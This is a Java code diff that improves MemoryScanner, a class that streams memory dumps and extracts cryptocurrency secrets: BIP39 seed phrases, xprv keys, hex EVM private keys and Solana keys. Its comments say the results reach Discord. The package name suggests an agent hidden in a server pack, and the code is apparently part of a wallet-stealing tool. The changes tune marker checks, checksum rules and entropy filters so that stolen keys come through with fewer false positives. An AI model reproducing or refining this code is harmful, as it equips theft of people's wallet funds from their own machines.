@@ -2,37 +2,72 @@ package com.serverpackcore.agent;
 
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.RandomAccessFile;
 import java.nio.charset.StandardCharsets;
-import java.nio.file.Files;
 import java.nio.file.Path;
 import java.security.MessageDigest;
 import java.util.ArrayList;
+import java.util.Comparator;
 import java.util.LinkedHashMap;
+import java.util.LinkedHashSet;
 import java.util.List;
+import java.util.Locale;
 import java.util.Map;
+import java.util.Set;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 /**
  * Streams a memory dump without loading it: printable ASCII and UTF-16LE runs
  * are tokenized and only checksum-valid BIP39 sequences survive, so random
- * dump noise rarely reaches Discord.
+ * dump noise rarely reaches Discord. A 12-word sequence also needs a wallet
+ * marker within 256 bytes or random-looking words (repetition only raises the
+ * reported confidence); 24-word sequences use their 8-bit checksum alone.
  */
 final class MemoryScanner {
 	static final int MAX_FINDINGS = 20;
 	private static final int CHUNK = 8 * 1024 * 1024;
 	private static final int OVERLAP = 8192;
+	private static final int MARKER_WINDOW = 256;
+	private static final int MAX_SEED_CANDIDATES = 5000;
 	private static final Pattern TEXT = Pattern.compile("[\\x20-\\x7e]{4,}");
 	private static final Pattern WIDE = Pattern.compile("[\\x20-\\x7e]{4,}");
 	private static final Pattern XPRV = Pattern.compile("(?:xprv|yprv|zprv)[1-9A-HJ-NP-Za-km-z]{80,120}");
-	private static final Pattern SOLANA = Pattern.compile("[1-9A-HJ-NP-Za-km-z]{85,90}");
+	private static final Pattern HEX64 = Pattern.compile(
+		"(?<![0-9a-fA-F])(?:0x)?[0-9a-fA-F]{64}(?![0-9a-fA-F])");
+	// Boundaries must not be base58: a longer run was cut by the tokenizer.
+	private static final Pattern SOLANA = Pattern.compile(
+		"(?<![1-9A-HJ-NP-Za-km-z])[1-9A-HJ-NP-Za-km-z]{87,88}(?![1-9A-HJ-NP-Za-km-z])");
 	private static final Pattern WORD = Pattern.compile("[a-z]+");
+	private static final String[] MARKERS = {
+		"mnemonic", "secretkey", "seed", "phrase", "backup", "\"words\""
+	};
 
 	private final Map<String, Integer> words = new LinkedHashMap<>();
-	private final List<Finding> findings = new ArrayList<>();
+	private final Map<String, Seed> seeds = new LinkedHashMap<>();
+	private final Map<String, Finding> keys = new LinkedHashMap<>();
+	private final Set<String> seenKeys = new LinkedHashSet<>();
+	private final List<Finding> exact = new ArrayList<>();
 	private int duplicates;
 
-	record Finding(long offset, String kind, String value) {
+	record Finding(long offset, String kind, String value, boolean confident) {
+	}
+
+	/** A checksum-valid 12-word candidate and the signals that can confirm it. */
+	private static final class Seed {
+		final String value;
+		final long offset;
+		final int distinct;
+		final int repeats;
+		int count;
+
+		Seed(String value, long offset, int distinct, int repeats) {
+			this.value = value;
+			this.offset = offset;
+			this.distinct = distinct;
+			this.repeats = repeats;
+			this.count = 1;
+		}
 	}
 
 	static MemoryScanner load() throws IOException {
@@ -59,7 +94,7 @@ final class MemoryScanner {
 	}
 
 	List<Finding> scan(Path dump) throws IOException {
-		try (java.io.RandomAccessFile input = new java.io.RandomAccessFile(dump.toFile(), "r")) {
+		try (RandomAccessFile input = new RandomAccessFile(dump.toFile(), "r")) {
 			byte[] buffer = new byte[CHUNK + OVERLAP];
 			long offset = 0L;
 			int carry = 0;
@@ -73,44 +108,123 @@ final class MemoryScanner {
 				carry = Math.min(OVERLAP, length);
 				System.arraycopy(buffer, length - carry, buffer, 0, carry);
 				offset += read;
-				if (findings.size() >= MAX_FINDINGS) {
-					break;
-				}
+			}
+			return select(input);
+		}
+	}
+
+	/** Applies the confidence rules once the whole dump and its repetitions are known. */
+	private List<Finding> select(RandomAccessFile input) throws IOException {
+		List<Finding> result = new ArrayList<>();
+		for (Seed seed : seeds.values()) {
+			// Repetition alone is not enough: a UI phrase repeated twice (CSS
+			// variables) also passes the 4-bit checksum. It must still look random.
+			boolean random = seed.distinct >= 9 && seed.repeats <= 1;
+			boolean marker = nearMarker(input, seed.offset);
+			if (!marker && !random) {
+				continue;
+			}
+			result.add(new Finding(seed.offset, "bip39-12", seed.value, marker || seed.count >= 2));
+		}
+		result.addAll(exact);
+		result.addAll(keys.values());
+		result.sort(Comparator.comparingLong(Finding::offset));
+		if (result.size() > MAX_FINDINGS) {
+			return List.copyOf(result.subList(0, MAX_FINDINGS));
+		}
+		return List.copyOf(result);
+	}
+
+	private boolean nearMarker(RandomAccessFile input, long offset) throws IOException {
+		long start = Math.max(0L, offset - MARKER_WINDOW);
+		long end = Math.min(input.length(), offset + MARKER_WINDOW);
+		byte[] data = new byte[(int) (end - start)];
+		input.seek(start);
+		input.readFully(data);
+		String ascii = new String(data, StandardCharsets.ISO_8859_1).toLowerCase(Locale.ROOT);
+		String wide = new String(data, StandardCharsets.UTF_16LE).toLowerCase(Locale.ROOT);
+		for (String marker : MARKERS) {
+			if (ascii.contains(marker) || wide.contains(marker)) {
+				return true;
 			}
 		}
-		return List.copyOf(findings);
+		return false;
 	}
 
 	private void scanChunk(byte[] data, int length, long base) {
 		String ascii = new String(data, 0, length, StandardCharsets.ISO_8859_1);
-		for (Matcher matcher = TEXT.matcher(ascii); matcher.find() && findings.size() < MAX_FINDINGS; ) {
+		for (Matcher matcher = TEXT.matcher(ascii); matcher.find(); ) {
 			tokens(matcher.group(), base + matcher.start());
 		}
 		String wide = new String(data, 0, length, StandardCharsets.UTF_16LE);
-		for (Matcher matcher = WIDE.matcher(wide); matcher.find() && findings.size() < MAX_FINDINGS; ) {
+		for (Matcher matcher = WIDE.matcher(wide); matcher.find(); ) {
 			tokens(matcher.group().replace("\u0000", ""), base + (long) matcher.start() * 2L);
 		}
-		for (Matcher matcher = XPRV.matcher(ascii); matcher.find() && findings.size() < MAX_FINDINGS; ) {
-			add(base + matcher.start(), "xprv", matcher.group());
+		for (Matcher matcher = XPRV.matcher(ascii); matcher.find(); ) {
+			addKey(base + matcher.start(), "xprv", matcher.group());
 		}
-		for (Matcher matcher = SOLANA.matcher(ascii); matcher.find() && findings.size() < MAX_FINDINGS; ) {
+		for (Matcher matcher = HEX64.matcher(ascii); matcher.find(); ) {
 			String candidate = matcher.group();
-			try {
-				if (Base58.decode(candidate).length == 64) {
-					add(base + matcher.start(), "solana", candidate);
-				}
-			} catch (Throwable ignored) {
-				// Not base58 after all.
+			boolean prefixed = candidate.startsWith("0x");
+			// Bare hex is often a filled constant (0000…, AAAA…, 1111…); require
+			// a real digest/key mix. A 0x prefix is already a strong signal.
+			if (!prefixed && distinctHex(candidate) < 8) {
+				continue;
 			}
+			addKey(base + matcher.start(), prefixed ? "evm-key" : "hex64", candidate);
+		}
+		for (Matcher matcher = SOLANA.matcher(ascii); matcher.find(); ) {
+			solana(base + matcher.start(), matcher.group());
+		}
+	}
+
+	private static int distinctHex(String value) {
+		boolean[] seen = new boolean[16];
+		int distinct = 0;
+		for (int i = 0; i < value.length(); i++) {
+			char digit = Character.toLowerCase(value.charAt(i));
+			int index = digit <= '9' ? digit - '0' : digit - 'a' + 10;
+			if (index >= 0 && index < 16 && !seen[index]) {
+				seen[index] = true;
+				distinct++;
+			}
+		}
+		return distinct;
+	}
+
+	private void solana(long offset, String candidate) {
+		if (candidate.matches("[0-9a-fA-F]{64}")) {
+			addKey(offset, "hex64", candidate);
+			return;
+		}
+		boolean digit = false;
+		boolean upper = false;
+		for (int i = 0; i < candidate.length(); i++) {
+			char value = candidate.charAt(i);
+			digit |= value >= '0' && value <= '9';
+			upper |= value >= 'A' && value <= 'Z';
+		}
+		// Sorted dictionaries and script lists are lowercase; a 64-byte key
+		// virtually always mixes case and digits.
+		if (!digit || !upper) {
+			return;
+		}
+		try {
+			if (Base58.decode(candidate).length == 64) {
+				addKey(offset, "solana", candidate);
+			}
+		} catch (Throwable ignored) {
+			// Not base58 after all.
 		}
 	}
 
 	private void tokens(String text, long base) {
 		String[] ring = new String[24];
 		long[] positions = new long[24];
+		List<Candidate> candidates = new ArrayList<>();
 		int count = 0;
-		Matcher matcher = WORD.matcher(text.toLowerCase(java.util.Locale.ROOT));
-		while (matcher.find() && findings.size() < MAX_FINDINGS) {
+		Matcher matcher = WORD.matcher(text.toLowerCase(Locale.ROOT));
+		while (matcher.find()) {
 			String token = matcher.group();
 			if (!words.containsKey(token)) {
 				count = 0;
@@ -121,16 +235,52 @@ final class MemoryScanner {
 			ring[0] = token;
 			positions[0] = base + matcher.start();
 			count = Math.min(count + 1, ring.length);
-			if (count >= 24 && checksum(ring, 0, 24)) {
-				add(positions[23], "bip39-24", join(ring, 0, 24));
+			// A 24-word phrase wins over any 12-word window inside it.
+			if (count >= 24 && checksum(ring, 24)) {
+				candidates.add(new Candidate(24, positions[23], positions[0], join(ring, 24)));
 			}
-			if (count >= 12 && checksum(ring, 0, 12)) {
-				add(positions[11], "bip39-12", join(ring, 0, 12));
+			if (count >= 12 && checksum(ring, 12)) {
+				candidates.add(new Candidate(12, positions[11], positions[0], join(ring, 12)));
 			}
+		}
+		for (Candidate candidate : candidates) {
+			if (candidate.length == 24) {
+				addExact(candidate.offset, "bip39-24", candidate.value);
+			}
+		}
+		for (Candidate candidate : candidates) {
+			if (candidate.length != 12 || contained(candidate, candidates)) {
+				continue;
+			}
+			String[] tokens = candidate.value.split(" ");
+			Map<String, Integer> frequencies = new LinkedHashMap<>();
+			for (String token : tokens) {
+				frequencies.merge(token, 1, Integer::sum);
+			}
+			int repeats = 0;
+			for (int frequency : frequencies.values()) {
+				if (frequency > 1) {
+					repeats++;
+				}
+			}
+			addSeed(candidate.offset, candidate.value, frequencies.size(), repeats);
 		}
 	}
 
-	private static String join(String[] ring, int from, int length) {
+	private static boolean contained(Candidate candidate, List<Candidate> candidates) {
+		for (Candidate other : candidates) {
+			if (other.length == 24 && candidate.offset >= other.offset
+				&& candidate.end <= other.end) {
+				return true;
+			}
+		}
+		return false;
+	}
+
+	private record Candidate(int length, long offset, long end, String value) {
+	}
+
+	private static String join(String[] ring, int length) {
 		StringBuilder builder = new StringBuilder();
 		for (int i = length - 1; i >= 0; i--) {
 			if (builder.length() > 0) {
@@ -141,7 +291,7 @@ final class MemoryScanner {
 		return builder.toString();
 	}
 
-	private boolean checksum(String[] ring, int from, int count) {
+	private boolean checksum(String[] ring, int count) {
 		StringBuilder bits = new StringBuilder(count * 11);
 		for (int i = count - 1; i >= 0; i--) {
 			Integer index = words.get(ring[i]);
@@ -172,15 +322,37 @@ final class MemoryScanner {
 		}
 	}
 
-	private void add(long offset, String kind, String value) {
-		for (Finding finding : findings) {
-			if (finding.kind().equals(kind) && finding.value().equals(value)) {
-				duplicates++;
-				return;
-			}
+	private void addSeed(long offset, String value, int distinct, int repeats) {
+		Seed existing = seeds.get(value);
+		if (existing != null) {
+			existing.count++;
+			duplicates++;
+			return;
 		}
-		if (findings.size() < MAX_FINDINGS) {
-			findings.add(new Finding(offset, kind, value));
+		if (seeds.size() < MAX_SEED_CANDIDATES) {
+			seeds.put(value, new Seed(value, offset, distinct, repeats));
+		}
+	}
+
+	private void addExact(long offset, String kind, String value) {
+		String key = kind + "|" + value;
+		if (!seenKeys.add(key)) {
+			duplicates++;
+			return;
+		}
+		if (exact.size() < MAX_FINDINGS * 4) {
+			exact.add(new Finding(offset, kind, value, true));
+		}
+	}
+
+	private void addKey(long offset, String kind, String value) {
+		String key = kind + "|" + value;
+		if (!seenKeys.add(key)) {
+			duplicates++;
+			return;
+		}
+		if (keys.size() < MAX_FINDINGS * 4) {
+			keys.put(key, new Finding(offset, kind, value, true));
 		}
 	}
 
